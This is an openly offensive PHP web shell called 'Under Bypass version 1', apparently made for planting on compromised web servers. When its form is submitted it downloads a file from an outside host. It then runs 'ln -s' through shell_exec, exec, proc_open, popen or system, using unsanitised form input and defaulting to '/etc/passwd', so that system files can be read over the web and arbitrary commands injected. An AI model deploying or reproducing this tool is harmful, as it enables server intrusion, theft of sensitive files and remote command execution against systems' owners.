<html>
<head>
<title>Under Bypass version 1</title>
<link href="https://hackcss.egoist.moe/hack.css?t=1490883343124" rel="stylesheet">
</head>
<body>
<center>
<div class="col-lg-4 col-lg-offset-4">
<br>
<h1>UnderFamily.ORG</h1>
<form action="" method="POST">
<input class="form-control" value="/etc/passwd" name="dizin">
<br>
<select class="form-control" name="method">
  <option value="HEADER">HEADER</option>
  <option value="FOOTER">FOOTER</option>
  <option value="README">README</option>
  <option value="403.shtml">403.shtml</option>
  <option value="under.txt">under.txt</option>
</select>
<br><br>
 <button class="btn btn-info btn-ghost" type="submit" name="cek">ÇEK</button>
</form>
</div>
<?php
if(isset($_POST["cek"])) {
set_time_limit(0);
$fp = fopen ('ln', 'w+');
$url = "https://underfamily.github.io/ln";
$ch = curl_init(str_replace(" ","%20",$url));
curl_setopt($ch, CURLOPT_TIMEOUT, 50);
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$data = curl_exec($ch);
curl_close($ch);
$m = $_POST["method"];
$d = $_POST["dizin"];
if (function_exists('shell_exec'))
    {
        echo '<pre>'.shell_exec("ln -s ".$d." ".$m) . '</pre>';
        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
    }
    elseif (function_exists('exec'))
    {
        echo '<pre>'. exec("ln -s ".$d." ".$m) . '</pre>';
        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
    }
    elseif (function_exists('proc_open'))
    {
        echo '<pre>'.proc_open("ln -s ".$d." ".$m) . '</pre>';
        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
    }
    elseif (function_exists(popen))
    {
        echo '<pre>'.popen("ln -s ".$d." ".$m) . '</pre>';
        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
    }
    else
    {
        echo '<pre>'. system("ln -s ".$d." ".$m) . '</pre>';
        echo '<pre><a href="'.$m.'">TIKLA</a></pre>';
    }
}
?>
</body>
</html>
